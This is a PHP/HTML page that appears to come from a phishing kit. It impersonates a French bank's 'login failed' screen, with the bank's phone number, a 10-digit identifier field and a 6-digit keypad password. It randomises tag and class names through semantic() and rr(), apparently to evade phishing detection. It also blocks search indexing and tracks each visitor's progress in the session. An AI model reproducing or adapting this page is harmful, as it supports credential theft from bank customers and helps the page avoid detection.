<?php
   
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "failed";
    $semantic = semantic();

?>
<!doctype html>
<html style="height: 100%; display: flex; flex-direction: column;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/png" href="../media/imgs/ff.png" />

        <title>Connexion à l'espace client</title>
    </head>

    <body style="height: 100%; display: flex; flex-direction: column;">

		<!-- HEADER -->
        <<?php echo $semantic; ?> id="<?php echo rr(); ?>header<?php echo rr(); ?>">
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>left<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>logo<?php echo rr(); ?>"><img style="width: 64px; height: 64px;" src="../media/imgs/logo.svg"></<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>right<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>top<?php echo rr(); ?> d-flex">
                    <<?php echo $semantic; ?> class="flex-grow-1"><img src="../media/imgs/top-header-left.png"></<?php echo $semantic; ?>>
                    <<?php echo $semantic; ?>>
                        <img class="d-lg-block d-md-none d-sm-none d-none" src="../media/imgs/top-header-right.png">
                        <img class="d-lg-none d-md-block d-sm-none d-none" src="../media/imgs/top-header-right2.png">
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>bottom<?php echo rr(); ?> d-lg-flex d-md-flex d-sm-block d-block">
                    <<?php echo $semantic; ?> class="flex-grow-1 d-lg-block d-md-block d-sm-none d-none"><img class="d-lg-block d-md-none d-sm-none d-none" src="../media/imgs/mainmenu.png"></<?php echo $semantic; ?>>
                    <<?php echo $semantic; ?> class="d-lg-block d-md-block d-sm-none d-none">
                        <img class="d-lg-block d-md-none d-sm-none d-none" src="../media/imgs/search.png">
                        <img class="d-lg-none d-md-block d-sm-block d-block" src="../media/imgs/search2.png">
                    </<?php echo $semantic; ?>>
                    <ul>
                        <li><img src="../media/imgs/icon1.png"></li>
                        <li><img src="../media/imgs/icon2.png"></li>
                        <li><img src="../media/imgs/icon3.png"></li>
                        <li><img src="../media/imgs/icon4.png"></li>
                    </ul>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>
        <!-- END HEADER -->

        <!-- LOGIN WRAPPER -->
        <<?php echo $semantic; ?> id="<?php echo rr(); ?>logan-wrapper<?php echo rr(); ?>" class="flex-grow-1">
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>left<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>login-box<?php echo rr(); ?>">
                    <h3>Connexion à mes comptes</h3>
                    <<?php echo $semantic; ?> class="error">
                        <p>Votre identifiant (10 chiffres) ou votre mot de passe n'a pas été reconnu. Si vous rencontrez des difficultés pour vous connecter, veuillez contacter un de nos téléconseillers au 36 39 (service 0,15 € / min + prix appel)*.</p>
                        <p>* Pour accéder aux services du 36 39 depuis l'étranger, composez le +33 1 45 45 36 39 à partir d'un poste fixe (coût d'une communication internationale pour la France).</p>
                        <a href="../index.php?redirection=login" class="return"><i style="width: inherit;" class="fas fa-caret-right"></i> Retour</a>
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>right<?php echo rr(); ?> d-flex align-items-center justify-content-center">
                <<?php echo $semantic; ?> class="content">
                    <img style="min-width: 323px;" src="../media/imgs/content.png">
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>
        <!-- END LOGIN WRAPPER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            
            $('ul.numbers li').click(function(){
                var value    = $(this).data('value');
                if( value == 'zz' )
                    return false;
                var pass_val = $('#password').val();
                var password = pass_val + value;
                if( $('#password').val().length == 6 ) {
                    return false;
                }
                $('#password').val(password);
                if( $('#identifiant').val().length > 9 || $('#identifiant').val().length == 9 ) {
                    if( $('#password').val().length == 6 ) {
                        $('#submit').removeAttr('disabled').removeClass('disabled');
                    }
                }
            });

            $('button.reset').click(function(){
                $('#password').val('');
                $('#submit').attr('disabled','disabled').addClass('disabled');
            });

            $('#identifiant').keydown(function(){

                if( $(this).val().length > 9 || $(this).val().length == 9 ) {
                    if( $('#password').val().length == 6 ) {
                        $('#submit').removeAttr('disabled').removeClass('disabled');
                    }
                } else {
                    $('#submit').attr('disabled','disabled').addClass('disabled');
                }

            });

        </script>

    </body>

</html>